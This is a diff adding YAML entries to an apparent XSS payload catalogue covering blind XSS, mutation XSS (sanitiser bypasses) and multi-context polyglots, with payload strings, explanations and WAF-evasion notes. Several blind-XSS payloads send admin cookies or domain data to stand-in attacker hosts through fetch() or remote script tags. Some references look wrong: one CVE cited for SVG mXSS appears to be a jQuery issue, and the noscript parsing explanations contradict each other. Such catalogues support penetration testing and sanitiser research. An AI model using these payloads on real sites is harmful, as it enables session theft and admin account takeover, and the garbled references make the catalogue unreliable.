+    - Referer header value stored and later rendered unsanitised in admin view
+    - Attacker controls a canary listener endpoint
+    waf_bypass_notes: Referer injection typically bypasses body/parameter WAF rules
+    severity_context: CVSS 8.8 – Blind XSS via Referer canary leading to admin account compromise
+    cve_refs: []
+    tags:
+    - blind
+    - referer
+    - header
+    - img-canary
+    - oob
+    - btoa
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-011
+    title: Blind XSS in noscript fallback content
+    payload_string: <noscript><p title="</noscript><img src=x onerror=fetch('//attacker.com/'+document.cookie)>">
+    how_it_works: 'Noscript elements can contain HTML that is parsed differently depending on whether JavaScript is enabled
+      in the browser. When a CMS or admin panel saves and later renders this content in a browser with JavaScript enabled,
+      the noscript block is treated as raw HTML, causing the injected onerror handler to execute when the browser attempts
+      to load the invalid img src. The payload fires in the admin''s session regardless of any client-side filtering because
+      the injection occurs in stored content. This is a classic HTML parser differential attack used in blind XSS scenarios
+      where the attack surface is in content storage paths.
+
+      '
+    prerequisites:
+    - Application accepts and stores noscript content
+    - Admin panel renders stored noscript blocks without sanitisation
+    waf_bypass_notes: Noscript-wrapped payloads often bypass WAF rules targeting script tags
+    severity_context: CVSS 8.0 – Blind XSS via noscript differential parsing
+    cve_refs: []
+    tags:
+    - blind
+    - noscript
+    - differential
+    - html-parser
+    - admin
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-012
+    title: Blind XSS via custom HTTP header in support ticket
+    payload_string: 'X-Forwarded-For: ><script src=https://bxss.attacker.com/payload.js></script>'
+    how_it_works: 'Support ticketing and incident management systems that log all HTTP headers for debugging purposes may
+      later display those headers unescaped in an engineer''s dashboard. An attacker submitting a support request with a crafted
+      X-Forwarded-For or similar custom header can trigger blind XSS execution when the support engineer views the request
+      details. The external script URL model (src=) allows the payload to be updated without re-triggering the injection,
+      giving the attacker a persistent callback mechanism. Session cookies from the support engineer may grant access to sensitive
+      customer data or internal systems.
+
+      '
+    prerequisites:
+    - Support or logging system records raw HTTP headers
+    - Engineer dashboard renders header values without HTML encoding
+    waf_bypass_notes: Custom headers rarely pass through WAF body inspection rules
+    severity_context: CVSS 8.8 – Blind XSS via support system header injection
+    cve_refs: []
+    tags:
+    - blind
+    - custom-header
+    - support-ticket
+    - x-forwarded-for
+    - admin
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-013
+    title: Blind XSS via SVG upload rendered in admin preview
+    payload_string: <svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//bxss.attacker.com/?c='+document.cookie)</script></svg>
+    how_it_works: 'SVG files are XML-based and can contain embedded script elements that execute when the SVG is rendered
+      inline by a browser. When an application allows SVG uploads and later displays a thumbnail or preview in an admin panel
+      without sandboxing (e.g., using an img tag with SVG source), the script executes in the admin''s browsing context. Blind
+      XSS via SVG is particularly effective because many file-upload filters focus on executable file extensions rather than
+      SVG content. The attacker''s fetch request exfiltrates the admin session cookie to an external callback, confirming
+      the XSS and enabling account takeover.
+
+      '
+    prerequisites:
+    - Application accepts SVG file uploads
+    - Admin panel renders SVG thumbnails inline without sandbox
+    waf_bypass_notes: SVG MIME type bypasses many image-only upload filters
+    severity_context: CVSS 8.8 – Blind XSS via SVG upload admin preview
+    cve_refs: []
+    tags:
+    - blind
+    - svg
+    - file-upload
+    - admin-preview
+    - inline-render
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-014
+    title: Blind XSS via EXIF metadata in uploaded image
+    payload_string: 'EXIF Comment: "><img src=x onerror=fetch(''//bxss.attacker.com/?d=''+document.domain)>'
+    how_it_works: 'Image processing libraries that extract and display EXIF metadata (author, comment, GPS fields) in admin
+      dashboards may render those values as raw HTML. An attacker embeds an XSS payload in the EXIF comment or author field
+      of a JPEG image and uploads it; when an administrator reviews the uploaded asset metadata, the payload fires in their
+      browser. The document.domain beacon confirms the origin of execution, helping the attacker understand the admin panel''s
+      domain. This vector bypasses image content-type checks entirely because the payload never appears in the image pixel
+      data.
+
+      '
+    prerequisites:
+    - Admin panel displays EXIF metadata from uploaded images
+    - EXIF fields rendered without HTML encoding
+    waf_bypass_notes: EXIF data in binary image payload bypasses text-based WAF rules
+    severity_context: CVSS 8.8 – Blind XSS via EXIF metadata admin display
+    cve_refs: []
+    tags:
+    - blind
+    - exif
+    - metadata
+    - image-upload
+    - admin
+    - jpeg
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-blind-015
+    title: Blind XSS via markdown rendered in admin comment thread
+    payload_string: '[click me](javascript:fetch(''//bxss.attacker.com/?c=''+document.cookie))'
+    how_it_works: 'Markdown renderers that allow javascript: URIs in link syntax can produce clickable XSS payloads when the
+      output is displayed in an admin comment thread or moderation panel. The attacker posts a comment with a crafted markdown
+      link; when an administrator clicks or hovers over the rendered link, the javascript: handler executes in their browsing
+      context. Even hover-triggered execution can exfiltrate session state via DNS prefetch. This is classified as blind XSS
+      because the payload is stored and does not fire until an admin interacts with the moderation view, often days or weeks
+      after submission.
+
+      '
+    prerequisites:
+    - Admin panel renders user-submitted Markdown
+    - 'Markdown renderer does not strip javascript: URI scheme'
+    waf_bypass_notes: Markdown link payloads often bypass HTML-tag-focused WAF rules
+    severity_context: 'CVSS 8.8 – Blind XSS via Markdown javascript: link in admin panel'
+    cve_refs: []
+    tags:
+    - blind
+    - markdown
+    - javascript-uri
+    - admin-comment
+    - link
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: mxss
+  name: mXSS
+  description: Exploits browser DOM parsing mutations that transform seemingly safe HTML into executable XSS payloads, bypassing
+    sanitizers that inspect raw markup rather than the parsed DOM.
+  difficulty: expert
+  prerequisites:
+  - Application uses client-side or server-side HTML sanitizer
+  - Sanitizer output is re-parsed by the browser (e.g., via innerHTML)
+  payloads:
+  - id: xss-mxss-001
+    title: DOMPurify namespace confusion bypass
+    payload_string: <math><mtext></option></select><img src=x onerror=alert(1)></math>
+    how_it_works: 'This payload exploits a namespace confusion in the HTML5 parser. The math element switches the parsing
+      namespace to MathML, within which certain tags have different semantics. When the sanitizer serializes the cleaned HTML
+      and the browser re-parses it, the namespace context may differ, causing the img tag to be interpreted as HTML and execute
+      the onerror handler. This type of mutation bypass specifically targets sanitizers that serialize back to string before
+      re-parsing, as the serialization/ parse cycle introduces the mutation.
+
+      '
+    prerequisites:
+    - DOMPurify or similar sanitizer processes the payload
+    - Sanitized output reinserted via innerHTML (causing re-parse)
+    waf_bypass_notes: Specific to sanitizer + browser version combinations
+    severity_context: CVSS 8.8 – sanitizer bypass via MathML namespace mutation
+    cve_refs:
+    - CVE-2020-26870
+    tags:
+    - mxss
+    - mathml
+    - namespace-confusion
+    - dompurify-bypass
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-002
+    title: SVG foreignObject mutation
+    payload_string: <svg><foreignObject><div><img src=1 onerror=alert(1)></div></foreignObject></svg>
+    how_it_works: 'SVG''s foreignObject element can embed arbitrary HTML content within an SVG context. Sanitizers processing
+      this in an HTML context may treat the content of foreignObject as text rather than HTML. When re-inserted into the DOM,
+      the browser switches to HTML parsing mode inside foreignObject, executing the img onerror handler. This mutation occurs
+      because the serialized form of the sanitized SVG is re-parsed differently than the sanitizer analyzed it.
+
+      '
+    prerequisites:
+    - Sanitizer does not recursively sanitize foreignObject content
+    - Output re-parsed by browser in HTML context
+    waf_bypass_notes: SVG foreignObject is a complex parsing edge case
+    severity_context: CVSS 8.0 – mXSS via SVG foreignObject HTML embedding
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - mxss
+    - svg
+    - foreignobject
+    - namespace-switch
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-003
+    title: Template element mutation
+    payload_string: <template><script>alert(1)</script></template>
+    how_it_works: 'The HTML5 template element holds inert markup — its content is parsed but not rendered or executed. Sanitizers
+      that inspect the live DOM may see the script as inert and allow it. However, if the sanitized output is serialized and
+      re-parsed outside a template context (e.g., via innerHTML on a non-template element), the script tag becomes active
+      and executes. This mutation occurs at the serialization boundary where the inert context is lost.
+
+      '
+    prerequisites:
+    - Sanitizer treats template content as inert
+    - Content serialized and re-inserted outside template context
+    waf_bypass_notes: template element semantics trick many sanitizers
+    severity_context: CVSS 8.0 – template element mutation from inert to active
+    cve_refs: []
+    tags:
+    - mxss
+    - template-element
+    - inert-content
+    - mutation
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-004
+    title: Table context mutation
+    payload_string: <table><td><script>alert(1)</script></td></table>
+    how_it_works: 'HTML table parsing has special rules where certain elements are not allowed inside table cells, causing
+      the browser to apply foster parenting — moving the element outside the table before rendering. A script tag inside a
+      td element may be foster-parented to outside the table in the parsed DOM, even if the sanitizer inspects the raw HTML
+      string and considers the script as being inside a table cell. This DOM mutation causes the script to be placed in a
+      normal document context where it executes.
+
+      '
+    prerequisites:
+    - Sanitizer inspects serialized HTML string rather than parsed DOM
+    - Browser applies foster parenting to injected element
+    waf_bypass_notes: Table foster parenting is a parsing quirk in all HTML5 browsers
+    severity_context: CVSS 8.0 – foster parenting table mutation to script execution
+    cve_refs: []
+    tags:
+    - mxss
+    - table
+    - foster-parenting
+    - parsing-quirk
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-005
+    title: noscript reparsing mutation
+    payload_string: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+    how_it_works: 'When JavaScript is enabled, the browser parses noscript content as raw text. When disabled, content is
+      parsed as HTML. A sanitizer running in a JavaScript-enabled environment sees the noscript content as text and passes
+      it. If the output is served to a browser with scripting disabled (or in an evaluation context that uses the disabled
+      path), the content is re-parsed as HTML. The img tag becomes executable. This is an advanced attack targeting the noscript
+      ambiguity in parsing modes.
+
+      '
+    prerequisites:
+    - Sanitizer parses with scripting enabled (sees noscript as text)
+    - Content rendered with scripting disabled or in alternate parse mode
+    waf_bypass_notes: Mode-dependent parsing; rare in modern environments
+    severity_context: CVSS 6.1 – parsing mode mutation via noscript ambiguity
+    cve_refs: []
+    tags:
+    - mxss
+    - noscript
+    - parsing-mode
+    - script-disabled
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-006
+    title: Style cdata mutation
+    payload_string: <style><!--</style><script>alert(1)//--></script>
+    how_it_works: 'HTML comment syntax inside style tags is handled inconsistently across parsers. A sanitizer may parse the
+      style tag content including the HTML comment open as CSS, considering the script tag as part of the CSS. The browser,
+      parsing the serialized output, may handle the comment differently, terminating the style block and executing the script.
+      This specific combination exploits the ambiguity between HTML comment treatment in CDATA-equivalent contexts like style
+      and script blocks.
+
+      '
+    prerequisites:
+    - Sanitizer and browser disagree on comment handling in style blocks
+    - Serialized output re-inserted via innerHTML
+    waf_bypass_notes: Complex interaction between style, comments, and script parsing
+    severity_context: CVSS 7.4 – style/comment/script mutation bypass
+    cve_refs: []
+    tags:
+    - mxss
+    - style-tag
+    - cdata
+    - comment-confusion
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-007
+    title: mXSS via SVG-in-form namespace confusion
+    payload_string: <form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>
+    how_it_works: 'Browsers apply different parsing rules for SVG and MathML namespaces embedded within HTML forms. This payload
+      exploits the way HTML5 parsers switch between HTML, MathML, and SVG parsing modes mid-stream, causing the inner form
+      element to be interpreted as a new HTML form context. The mglyph/svg/mtext combination creates a namespace boundary
+      where the style element can contain an img tag with an onerror handler. When a sanitiser serialises and re-parses this
+      tree, the namespace transitions produce a different DOM structure than expected, allowing the payload to survive the
+      sanitisation round-trip. The attacker gains JavaScript execution in the victim''s browsing context.
+
+      '
+    prerequisites:
+    - Sanitiser uses an HTML parser that respects SVG/MathML namespaces
+    - Content later rendered by a browser with HTML5 parser
+    waf_bypass_notes: Form-math-svg namespace transitions bypass most DOM-based sanitisers
+    severity_context: CVSS 7.4 – mXSS via SVG-in-form namespace confusion
+    cve_refs: []
+    tags:
+    - mxss
+    - svg
+    - form
+    - mathml
+    - namespace
+    - parser-differential
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-008
+    title: mXSS via noembed element reparse
+    payload_string: <noembed>&lt;/noembed&gt;<img src=x onerror=alert(1)>&lt;noembed&gt;</noembed>
+    how_it_works: 'The noembed element''s content is treated as raw text by HTML parsers, meaning the browser does not parse
+      child tags inside noembed. Some sanitisers that serialise and then re-parse sanitised HTML apply different rules, treating
+      noembed as parsed HTML during the sanitisation pass. This discrepancy means a payload that appears harmless during sanitisation
+      can survive and become executable when the browser''s HTML parser processes the final output. The entity-encoded closing
+      tag tricks the sanitiser into thinking noembed is properly closed while the browser continues parsing and reaches the
+      live onerror handler. This is a documented differential parsing vulnerability.
+
+      '
+    prerequisites:
+    - Sanitiser uses innerHTML-based serialisation path
+    - Browser HTML5 parser used for final render
+    waf_bypass_notes: noembed raw-text parsing prevents WAF pattern matching on children
+    severity_context: CVSS 7.4 – mXSS via noembed element reparse differential
+    cve_refs: []
+    tags:
+    - mxss
+    - noembed
+    - parser-differential
+    - raw-text
+    - reparse
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-009
+    title: mXSS via select-option context mutation
+    payload_string: <select><option><script>alert(1)</script></option></select>
+    how_it_works: 'Select and option elements have special parsing rules in HTML5: content inside option elements is treated
+      as text rather than HTML. A serialise-then-parse mutation XSS occurs when a sanitiser iterates over the DOM tree and
+      serialises a script element as a child of option, only for the browser to re-parse the serialised HTML with the script
+      appearing outside the option context. The sanitiser sees a text node; the re-parsed DOM contains an executable script
+      element. This class of mXSS has affected multiple popular sanitiser libraries and highlights the importance of context-aware
+      content models. The practical impact is JavaScript execution when sanitised HTML is later inserted into a page.
+
+      '
+    prerequisites:
+    - Sanitiser does not validate element nesting rules before serialise-and-reparse
+    - Serialised output re-inserted via innerHTML
+    waf_bypass_notes: Option-context injection bypasses script-tag pattern rules
+    severity_context: CVSS 7.4 – mXSS via select option context reparse
+    cve_refs: []
+    tags:
+    - mxss
+    - select
+    - option
+    - context-mutation
+    - serialise-reparse
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-010
+    title: mXSS via table foster-parenting algorithm
+    payload_string: <table><td><p><b><s><i><u><strike></table><img src=x onerror=alert(1)>
+    how_it_works: 'The HTML5 adoption agency algorithm governs how the browser handles misnested formatting elements around
+      table structures. When deeply nested formatting tags span a table boundary, the browser''s parser uses foster parenting
+      to move table content outside the table, producing a DOM structure fundamentally different from the source markup. Sanitisers
+      that walk the source tree rather than the foster-parented tree may miss elements that the browser will promote to the
+      outer document. An onerror handler after the table fires because the img element ends up in a position the sanitiser
+      never examined. This is a well-documented parser-level mXSS vector affecting multiple sanitiser libraries.
+
+      '
+    prerequisites:
+    - Sanitiser does not account for foster parenting during DOM walk
+    - Final rendering uses browser HTML5 parser
+    waf_bypass_notes: Table foster-parenting mutations bypass serialisation-based defenses
+    severity_context: CVSS 7.4 – mXSS via adoption agency table foster parenting
+    cve_refs: []
+    tags:
+    - mxss
+    - table
+    - foster-parenting
+    - adoption-agency
+    - html5
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-011
+    title: mXSS via textarea innerHTML entity decoding
+    payload_string: <textarea>&lt;/textarea&gt;<img src=x onerror=alert(1)>&lt;textarea&gt;</textarea>
+    how_it_works: 'Textarea elements are raw-text elements in HTML5: the browser treats their content as unparsed text. However,
+      when innerHTML is used to assign content containing an entity-encoded closing textarea tag, the serialiser may produce
+      literal characters that, when re-parsed by another innerHTML assignment, create an exploitable context switch. The attacker''s
+      payload survives an initial sanitisation pass because it appears to be text, then executes after the second parse when
+      the entity-encoded closing tag is decoded. This class of vulnerability has affected popular JavaScript sanitiser libraries
+      and highlights the risk of innerHTML-based sanitisation pipelines. Attackers gain arbitrary JavaScript execution within
+      the target origin.
+
+      '
+    prerequisites:
+    - Sanitiser relies on innerHTML serialisation without context-aware text normalisation
+    - Output set via innerHTML on re-render
+    waf_bypass_notes: Entity-encoded closing tags defeat pattern-matching WAF rules
+    severity_context: CVSS 7.4 – mXSS via textarea innerHTML entity decoding
+    cve_refs: []
+    tags:
+    - mxss
+    - textarea
+    - innerHTML
+    - entity-encoding
+    - raw-text
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-012
+    title: mXSS via math annotation-xml namespace escape
+    payload_string: <math><annotation-xml encoding="application/xhtml+xml"><img src=x onerror=alert(1)></annotation-xml></math>
+    how_it_works: 'MathML''s annotation-xml element with encoding set to application/xhtml+xml signals to the HTML5 parser
+      that the content should be parsed as XHTML, allowing HTML elements to appear inside the MathML tree with full HTML semantics.
+      Sanitisers that treat annotation-xml as an opaque MathML container may allow HTML tags inside it without recognising
+      that the encoding attribute triggers a namespace switch. The browser then processes the img element''s onerror handler
+      as real HTML, executing the attacker''s JavaScript. This technique targets the gap between sanitiser understanding of
+      MathML encoding annotations and actual browser parser behaviour, and has been weaponised in real-world attacks.
+
+      '
+    prerequisites:
+    - Sanitiser allows MathML elements including annotation-xml
+    - Sanitiser does not inspect the encoding attribute for namespace implications
+    waf_bypass_notes: MathML annotation encoding bypasses most HTML-focused WAF rules
+    severity_context: CVSS 7.4 – mXSS via MathML annotation-xml namespace escape
+    cve_refs: []
+    tags:
+    - mxss
+    - mathml
+    - annotation-xml
+    - namespace-escape
+    - encoding
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-013
+    title: mXSS via plaintext raw-text element
+    payload_string: <plaintext><!--</plaintext><img src=x onerror=alert(1)>-->
+    how_it_works: 'The plaintext element is an obsolete HTML element that tells the parser to treat all subsequent content
+      as plain text. When a sanitiser does not handle this element correctly, content after the plaintext tag may be misclassified
+      as text when it is actually executable HTML. The combination with an HTML comment creates a parser ambiguity: the sanitiser
+      may see the comment as closing the plaintext text context while the browser''s parser keeps raw-text mode active for
+      the img onerror handler. This technique has historically bypassed multiple server-side HTML sanitisation libraries,
+      allowing stored XSS via the plaintext element vector. Attackers gain JavaScript execution in the document origin.
+
+      '
+    prerequisites:
+    - Sanitiser does not recognise plaintext as a raw-text element
+    - Output rendered by a modern HTML5 parser
+    waf_bypass_notes: plaintext + comment combination defeats standard HTML filtering
+    severity_context: CVSS 7.4 – mXSS via plaintext raw-text element
+    cve_refs: []
+    tags:
+    - mxss
+    - plaintext
+    - raw-text
+    - obsolete-element
+    - comment
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-014
+    title: mXSS via deferred script in HTML template element
+    payload_string: <template><script>alert(document.domain)</script></template>
+    how_it_works: 'Template elements in HTML5 contain inert document fragments that are not rendered or executed in their
+      initial position. Sanitisers that walk the live DOM tree may observe the script tag as inert (because it is inside a
+      template) and decline to remove it. If the sanitised template element is later activated by legitimate application code
+      using cloneNode() or importNode(), the script executes in the victim''s session. This creates a stored time-bomb: the
+      sanitiser passes the payload, and the application itself triggers execution. The attack is subtle because no obvious
+      indicator of XSS appears at sanitisation time, only when the template is instantiated by the application''s own rendering
+      logic.
+
+      '
+    prerequisites:
+    - Application activates templates using cloneNode() or importNode()
+    - Sanitiser does not strip script tags inside template elements
+    waf_bypass_notes: Template-scoped scripts bypass active-content WAF inspection
+    severity_context: CVSS 7.4 – mXSS via deferred script in HTML template
+    cve_refs: []
+    tags:
+    - mxss
+    - template
+    - clone-node
+    - deferred
+    - inert
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-mxss-015
+    title: mXSS via iframe srcdoc attribute mutation
+    payload_string: <iframe srcdoc='&lt;script&gt;parent.eval(location.hash.slice(1))&lt;/script&gt;'></iframe>
+    how_it_works: 'The srcdoc attribute on iframe elements contains HTML that is parsed as a separate document. When a sanitiser
+      processes the outer document, it may decode the entity-encoded script tags within the srcdoc value and re-encode them
+      differently, or apply inconsistent rules to attribute-context HTML. The browser then parses the resulting srcdoc as
+      a new HTML document, executing the script in a same-origin context relative to the parent page. Using parent.eval()
+      with the location hash allows the attacker to inject arbitrary code via the fragment identifier without the payload
+      appearing in the stored attribute value. This is a high-value mXSS technique requiring a sanitiser that processes srcdoc
+      content differently from inline HTML.
+
+      '
+    prerequisites:
+    - Sanitiser does not recursively sanitise srcdoc attribute content
+    - Iframe srcdoc elements allowed in rendered output
+    waf_bypass_notes: Attribute-context HTML encoding bypasses most tag-based WAF rules
+    severity_context: CVSS 8.0 – mXSS via iframe srcdoc attribute parent.eval()
+    cve_refs: []
+    tags:
+    - mxss
+    - iframe
+    - srcdoc
+    - attribute-mutation
+    - parent-eval
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: polyglots
+  name: Polyglots
+  description: Single payloads that execute XSS across multiple injection contexts simultaneously — HTML body, attribute,
+    JavaScript string, and URL contexts.
+  difficulty: expert
+  prerequisites:
+  - Testing unknown injection context
+  - Need to confirm XSS without knowing exact reflection point type
+  payloads:
+  - id: xss-poly-001
+    title: Ashar Javed polyglot
+    payload_string: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//
+    how_it_works: 'This polyglot was designed to execute in the maximum number of HTML contexts with a single payload string.
+      It opens with a javascript: URI for href/src contexts, includes JavaScript comment syntax for script contexts, uses
+      backtick for template literal contexts, includes quote variants for attribute escape, and closes multiple tag types
+      (style, title, textarea, script) to break out of any of those contexts. The SVG onload at the end executes in HTML body
+      context. It is commonly used for rapid context identification during pentesting.
+
+      '
+    prerequisites:
+    - Unknown injection context
+    - Multiple potential reflection points
+    waf_bypass_notes: Long payload; WAF may flag by length; use shorter variants for bypass
+    severity_context: CVSS 7.4 – multi-context XSS polyglot for maximum coverage
+    cve_refs: []
+    tags:
+    - polyglot
+    - multi-context
+    - discovery
+    - comprehensive
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-002
+    title: Short universal polyglot
+    payload_string: \';"><svg/onload=alert(1)>//
+    how_it_works: 'This compact polyglot covers four common injection contexts. The backslash-single-quote escapes JavaScript
+      string contexts with backslash handling. The semicolon terminates any prior JavaScript statement. The double-quote closes
+      HTML attribute contexts. The SVG onload covers HTML body injection. The forward-slashes at the end comment out trailing
+      code that might cause syntax errors. This is an efficient first-try polyglot for automated scanning and manual testing.
+
+      '
+    prerequisites:
+    - 'One of: JS string context, HTML attribute, or HTML body injection'
+    waf_bypass_notes: Short and commonly used; likely flagged by WAFs; use as baseline only
+    severity_context: CVSS 6.1 – compact multi-context polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - short
+    - multi-context
+    - scanning
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-003
+    title: HTML and JS string polyglot
+    payload_string: </script><script>alert(1)</script>
+    how_it_works: 'This payload is designed for contexts where user input is reflected inside a JavaScript block. The </script>
+      sequence terminates the enclosing script block, which is processed by the HTML parser even though it appears inside
+      JavaScript. The subsequent script tag opens a new executable block. This exploits the HTML parser''s precedence over
+      the JavaScript parser for the </script> token. It is one of the most reliable payloads for server-side template rendering
+      into script blocks.
+
+      '
+    prerequisites:
+    - Input reflected inside a JavaScript block in an HTML page
+    waf_bypass_notes: Terminating </script> is detected by most WAFs; case variation helps
+    severity_context: CVSS 6.1 – script block break-out polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - script-breakout
+    - js-context
+    - html-parser
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-004
+    title: CSS and HTML polyglot
+    payload_string: '"></style></title></textarea><script>alert(1)</script>'
+    how_it_works: 'This polyglot closes multiple common enclosing contexts before injecting a script tag. It attempts to close
+      style, title, and textarea elements — all of which have special parsing rules that prevent their content from being
+      interpreted as HTML. Once those are closed, the script tag executes in a normal HTML body context. This is useful when
+      the tester knows input is reflected somewhere after a style or title tag but is unsure of the exact context.
+
+      '
+    prerequisites:
+    - Input reflected after a style, title, textarea, or similar context-altering tag
+    waf_bypass_notes: Multiple closing tags; obfuscate with whitespace or encoding
+    severity_context: CVSS 6.1 – multi-context closer before script injection
+    cve_refs: []
+    tags:
+    - polyglot
+    - context-closer
+    - style-title-textarea
+    - multi-context
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-005
+    title: URL context polyglot
+    payload_string: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+    how_it_works: 'This advanced polyglot begins with the javascript: scheme for URL contexts (href, src, action attributes)
+      and continues with closers for title, style, textarea, script, and xmp elements. The SVG onload provides HTML body execution.
+      The alert is wrapped in arithmetic operators and array syntax that parse as valid JavaScript across different contexts.
+      The combination covers URI contexts, various HTML tag contents, and attribute contexts in one payload, maximizing the
+      probability of execution in unknown contexts.
+
+      '
+    prerequisites:
+    - Unknown injection context; possibly URL, HTML attribute, or body
+    waf_bypass_notes: Complex payload; operator-wrapped alert evades some pattern matching
+    severity_context: CVSS 7.4 – comprehensive URL-to-HTML polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - url-context
+    - comprehensive
+    - advanced
+    - operator-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-006
+    title: JSON/JS/HTML triple-context polyglot
+    payload_string: '"};</script><script>alert(1)//</script>'
+    how_it_works: 'This payload terminates a JSON object literal (closing brace) and a JavaScript string (double quote), then
+      terminates the enclosing script block with </script>. A new script tag follows with the alert payload. The comment at
+      the end suppresses any trailing syntax errors. This is specifically designed for cases where JSON is embedded in a script
+      block as a JavaScript object literal, which is common in server-side rendered pages that inject configuration objects
+      into JavaScript.
+
+      '
+    prerequisites:
+    - Input injected into a JSON object inside a script block
+    - Server-side template renders JSON configuration in script tags
+    waf_bypass_notes: JSON-specific; WAFs may not match JSON termination patterns
+    severity_context: CVSS 6.1 – JSON-in-script-block break-out polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - json-context
+    - script-breakout
+    - server-side-template
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-007
+    title: AngularJS/HTML polyglot
+    payload_string: '{{7*7}}[NG:CSP]<script>alert(1)</script>'
+    how_it_works: 'This polyglot tests for both AngularJS template injection and regular HTML XSS simultaneously. The {{7*7}}
+      evaluates to 49 in AngularJS contexts, confirming template injection. The [NG:CSP] is an Angular CSP marker. The script
+      tag covers regular HTML XSS. By sending this single payload, the tester can identify three different vulnerability classes
+      at once. In an Angular app, seeing ''49'' confirms template injection; seeing the script execute confirms XSS; and the
+      CSP marker reveals Angular CSP mode.
+
+      '
+    prerequisites:
+    - AngularJS application or regular HTML reflection
+    waf_bypass_notes: Template syntax may not be in WAF XSS signatures
+    severity_context: CVSS 7.4 – simultaneous Angular SSTI and HTML XSS probe
+    cve_refs: []
+    tags:
+    - polyglot
+    - angularjs
+    - ssti-probe
+    - multi-vulnerability
+    - detection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-008
+    title: Attribute and event polyglot
+    payload_string: x onmouseover=alert(1) autofocus onfocus=alert(1) onclick=alert(1)
+    how_it_works: 'When injected into an existing HTML attribute value without quote escaping, this payload adds three event
+      handlers to the same element. onmouseover fires on mouse hover, autofocus+onfocus fires automatically on page load for
+      focusable elements, and onclick fires on click. Multiple handlers increase the probability that at least one will fire
+      regardless of how the user interacts with the element. This is a maximally reliable attribute injection payload.
+
+      '
+    prerequisites:
+    - Input reflected inside an HTML attribute without quote encoding
+    - Element is interactive (link, input, button) or autofocusable
+    waf_bypass_notes: No tag injection; relies on existing tag context
+    severity_context: CVSS 6.1 – multi-event attribute injection for reliability
+    cve_refs: []
+    tags:
+    - polyglot
+    - attribute-injection
+    - multi-event
+    - no-tag-needed
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-009
+    title: Null byte and whitespace bypass polyglot
+    payload_string: "<script\0>alert(1)</script>"
+    how_it_works: 'Some parsers and filters treat null bytes as string terminators, causing them to stop reading at the null
+      byte and missing the rest of the tag name. The browser, however, may strip the null byte during parsing and process
+      the element as a valid script tag. This discrepancy between how the filter and the browser interpret the null byte leads
+      to filter bypass. This is an encoding-level attack targeting filter implementation details rather than HTML semantics.
+
+      '
+    prerequisites:
+    - Input filter treats null byte as string terminator
+    - Browser strips null bytes and processes tag normally
+    waf_bypass_notes: Null byte handling varies; test with %00 in URL encoding
+    severity_context: CVSS 6.1 – null byte filter bypass via parser discrepancy
+    cve_refs: []
+    tags:
+    - polyglot
+    - null-byte
+    - parser-discrepancy
+    - encoding-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-010
+    title: Unicode normalization bypass
+    payload_string: <ſcript>alert(1)</ſcript>
+    how_it_works: 'Unicode normalization maps visually similar characters to their canonical ASCII equivalents. The character
+      ''ſ'' (U+017F, Latin small letter long s) normalizes to ''s'' under Unicode NFKC normalization. If the application normalizes
+      Unicode after checking for the word ''script'', the normalized form becomes a valid script tag. This bypasses filters
+      that scan for the literal ASCII word ''script''. The browser receives the normalized form which it executes.
+
+      '
+    prerequisites:
+    - Application performs Unicode normalization after input validation
+    - Filter checks raw input before normalization
+    waf_bypass_notes: Effective against applications that normalize Unicode post-validation
+    severity_context: CVSS 6.1 – Unicode normalization filter bypass
+    cve_refs: []
+    tags:
+    - polyglot
+    - unicode-normalization
+    - homoglyph
+    - encoding-bypass
+    - advanced
